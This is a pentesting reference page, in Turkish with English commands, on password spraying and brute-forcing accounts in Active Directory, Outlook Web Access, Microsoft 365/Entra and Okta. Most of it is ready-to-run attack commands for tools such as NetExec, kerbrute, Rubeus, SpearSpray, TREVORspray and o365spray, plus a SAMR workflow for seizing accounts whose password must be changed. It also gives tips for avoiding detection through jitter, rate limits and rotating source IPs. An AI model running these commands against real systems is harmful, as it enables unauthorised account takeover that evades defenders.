# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Birkaç **valid username** bulduktan sonra, keşfedilen kullanıcıların her biriyle en **common passwords** değerlerini deneyebilirsiniz (ortamın password policy'sini göz önünde bulundurun).\
**Varsayılan olarak** **minimum** **password** **length** **7**'dir.

Yaygın kullanıcı adlarının listeleri de yararlı olabilir: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

**Birden fazla yanlış password denerseniz bazı hesapları lockout durumuna sokabileceğinizi** unutmayın (varsayılan olarak 10'dan fazla).

### Get password policy

Bazı user credentials bilgileriniz veya domain user olarak bir shell'iniz varsa **password policy'yi şu şekilde alabilirsiniz**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Linux'tan Exploitation (veya tümü)

- **crackmapexec** kullanarak:
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- SMB/WinRM genelinde hedefli, düşük gürültülü spraying için **NetExec (CME successor)** kullanarak:
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- [**kerbrute**](https://github.com/ropnop/kerbrute) (Go) kullanarak
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(hesap kilitlenmelerini önlemek için deneme sayısını belirtebilirsiniz):**_<sup>[[3]](#references)</sup>
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) kullanarak - BAZEN ÇALIŞMADIĞI İÇİN ÖNERİLMEZ<sup>[[2]](#references)</sup>
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- **Metasploit**'in `scanner/smb/smb_login` modülü ile:

![Password Spraying - Brute-Force: Metasploit'in scanner/smb/smb login modülü ile](<../../images/image (745).png>)

- **rpcclient** kullanarak:<sup>[[6]](#references)</sup>
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Windows'tan

- brute modülünü içeren [Rubeus](https://github.com/Zer1t0/Rubeus) sürümüyle:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) ile (Varsayılan olarak domain'den kullanıcılar oluşturabilir, password policy'yi domain'den alır ve denemeleri buna göre sınırlar):<sup>[[4]](#references)</sup>
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1) ile
```
Invoke-SprayEmptyPassword
```
### "Bir sonraki oturum açmada parola değiştirilmelidir" Hesaplarını Belirleme ve Ele Geçirme (SAMR)

Düşük gürültülü bir teknik olarak, zararsız/boş bir parolayı spray ederek `STATUS_PASSWORD_MUST_CHANGE` döndüren hesapları yakalayabilirsiniz. Bu durum, parolanın zorunlu olarak süresinin dolduğunu ve eski parola bilinmeden değiştirilebileceğini gösterir.<sup>[[9]](#references)[[10]](#references)</sup>

İş akışı:
- Hedef listesini oluşturmak için kullanıcıları (SAMR üzerinden RID brute) enumerate edin:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Boş bir parola ile spray yapın ve sonraki oturum açmada parola değiştirmesi gereken hesapları yakalamak için başarılı sonuçlarda devam edin:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Her eşleşme için, NetExec’in module’ünü kullanarak SAMR üzerinden password’ü değiştirin ("must change" ayarlandığında eski password gerekmez):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Operasyonel notlar:
- Kerberos tabanlı işlemlerden önce host saatinizin DC ile senkronize olduğundan emin olun: `sudo ntpdate <dc_fqdn>`.
- Bazı modüllerde (ör. RDP/WinRM) (Pwn3d!) olmadan görünen bir [+], kimlik bilgilerinin geçerli olduğu ancak hesabın etkileşimli oturum açma haklarına sahip olmadığı anlamına gelir.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### LDAP hedeflemeli ve PSO-aware throttling ile Kerberos pre-auth spraying (SpearSpray)

Kerberos pre-auth tabanlı spraying, SMB/NTLM/LDAP bind denemelerine kıyasla gürültüyü azaltır ve AD lockout politikalarıyla daha iyi uyum sağlar. SpearSpray, hassas ve güvenli spraying gerçekleştirmek için LDAP-driven targeting, bir pattern engine ve policy awareness (domain policy + PSO'lar + badPwdCount buffer) özelliklerini birleştirir. Ayrıca ele geçirilen principal'ları BloodHound pathing için Neo4j'de etiketleyebilir.<sup>[[1]](#references)</sup>

Temel fikirler:
- Paging ve LDAPS desteğiyle LDAP user discovery; isteğe bağlı olarak custom LDAP filter'lar kullanılabilir.
- Kullanıcıların lock edilmesini önlemek için yapılandırılabilir bir attempt buffer (threshold) bırakan domain lockout policy + PSO-aware filtering.
- Fast gssapi bindings kullanarak Kerberos pre-auth validation (DC'lerde 4625 yerine 4768/4771 oluşturur).
- Her kullanıcının pwdLastSet değerinden türetilen names ve temporal values gibi değişkenleri kullanan pattern-based, per-user password generation.
- Threads, jitter ve saniye başına maksimum istek sayısıyla throughput control.
- BloodHound için owned user'ları işaretlemek üzere isteğe bağlı Neo4j integration.

Temel kullanım ve discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Hedefleme ve pattern kontrolü:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Gizlilik ve güvenlik kontrolleri:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound zenginleştirmesi:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Pattern sistemi genel bakışı (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Mevcut değişkenler şunlardır:
- {name}, {samaccountname}
- Her kullanıcının pwdLastSet (veya whenCreated) değerinden alınan zaman bilgileri: {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Composition yardımcıları ve org token: {separator}, {suffix}, {extra}

Operasyonel notlar:

- En yetkili badPwdCount ve policy ile ilgili bilgileri okumak için -dc ile PDC-emulator sorgulamayı tercih edin.
- badPwdCount sıfırlamaları, gözlem penceresinden sonraki ilk denemede tetiklenir; güvende kalmak için threshold ve zamanlamayı kullanın.
- Kerberos pre-auth denemeleri DC telemetry üzerinde 4768/4771 olarak görünür; normal trafikle karışmak için jitter ve rate-limiting kullanın.

> İpucu: SpearSpray’in varsayılan LDAP page size değeri 200’dür; gerektiğinde -lps ile ayarlayın.

## Outlook Web Access

**password spraying outlook** için birden fazla araç vardır.

- [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/) ile
- [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/) ile
- [Ruler](https://github.com/sensepost/ruler) ile (güvenilir!)<sup>[[5]](#references)</sup>
- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) ile (Powershell)
- [MailSniper](https://github.com/dafthack/MailSniper) ile (Powershell)

Bu araçlardan herhangi birini kullanmak için bir kullanıcı listesine ve spray uygulanacak bir parolaya / küçük bir parola listesine ihtiyacınız vardır.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Microsoft 365 / Entra ID

Cloud spraying için öncelikle tenant'ın **managed**, **federated** veya **hybrid** olup olmadığını belirleyin; çünkü endpoint ve lockout davranışı on-prem AD'den farklı olabilir. Microsoft Entra'da **Smart Lockout**, tekrarlanan tahminlerin lockout bütçesini nasıl tükettiğini değiştirir:<sup>[[7]](#references)</sup>

- Aynı **hatalı parolayı** tekrarlamak lockout sayacını artırmaya devam etmez, ancak **yeni adayları** denemek artırır.
- **Familiar** ve **unfamiliar** konumların ayrı sayaçları vardır.
- **Pass-through authentication (PTA)** kullanan tenant'lar, hatalı parola hash takibinden yararlanmaz; bu nedenle onları klasik lockout hassasiyetine sahip hedefler gibi değerlendirin.

Pratikte her round'da **tek bir parola** spray edin, round'lar arasında yeterli aralık bırakın ve tahminleri göndermeden önce tenant'ın gerçek auth akışını keşfedebilen tooling'i tercih edin.

- [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray) ile tenant üzerinde recon yapabilir, `token_endpoint` değerini keşfedebilir, `msol`/`adfs`/`owa`/`okta` üzerinde spray yapabilir ve trafiği birden fazla egress IP üzerinden döndürebilirsiniz:
```bash
# Enumerate tenant info, autodiscover, and the token endpoint
trevorspray --recon corp.com

# Spray against the discovered token endpoint with delay/jitter
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--delay 5 --jitter 3 --lockout-delay 60

# Round-robin between multiple SSH egress points
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--ssh root@1.2.3.4 root@4.3.2.1 --delay 5
```
- [**Spray365**](https://github.com/MarkoH17/Spray365) ile devam ettirilebilir bir **yürütme planı** önceden oluşturabilir, kimlik doğrulama sırasını rastgeleleştirebilir ve kilitleme penceresinin dışında kalmak için **kullanıcı başına minimum gecikme** uygulayabilirsiniz:
```bash
# Generate a plan with shuffled auth order and a per-user minimum delay
python3 spray365.py generate normal -ep plan.s365 -d corp.com \
-u users.txt -pf passwords.txt --delay 30 -mD 1800 \
-S -rUA

# Execute the plan and abort after observing several lockouts
python3 spray365.py spray -ep plan.s365 -l 5
```
- [**o365spray**](https://github.com/0xZDH/o365spray) ile tenant'ı doğrulayabilir, `onedrive` gibi modüllerle kullanıcıları enumerate edebilir ve her lockout window'unda **kullanıcı başına bir deneme** sınırını koruyarak `oauth2` veya `adfs` üzerinden spray yapabilirsiniz. Zaten bir FireProx API'niz varsa, kaynak IP'lerini dağıtmak için `--proxy-url` ile iletin:
```bash
o365spray --validate --domain corp.com
o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
```
Son dönemlerde operator tradecraft, **distributed cloud spraying** yaklaşımına da yöneldi. [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration) zaman aralıklarını, password shuffling'i, ADFS/M365 spraying'i ve otomatik post-auth exfiltration'ı destekler. Yakın zamanda gerçekleşen gerçek dünya saldırılarında, spray dalgalarını birden fazla kaynak coğrafyaya yaymak için **Microsoft Teams API** account enumeration ve **AWS region rotation** da kullanıldı.<sup>[[8]](#references)</sup>

## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Referanslar

- [1] [SpearSpray – Enhance Your Active Directory Password Spraying with User Intelligence](https://github.com/sikumy/spearspray)
- [2] [TarlogicSecurity/kerbrute – Kerberos bruteforcing with Impacket (Python)](https://github.com/TarlogicSecurity/kerbrute)
- [3] [Spray – A Password Spraying tool for Active Directory Credentials](https://github.com/Greenwolf/Spray)
- [4] [Active Directory Password Spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [5] [Password Spraying Outlook Web Access: Remote Shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [6] [Password Spraying & Other Fun with RPCCLIENT](https://www.blackhillsinfosec.com/?p=5296)
- [7] [Microsoft Entra smart lockout](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
- [8] [Proofpoint: Attackers Unleash TeamFiltration: Account Takeover Campaign](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
- [9] [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [10] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)

{{#include ../../banners/hacktricks-training.md}}
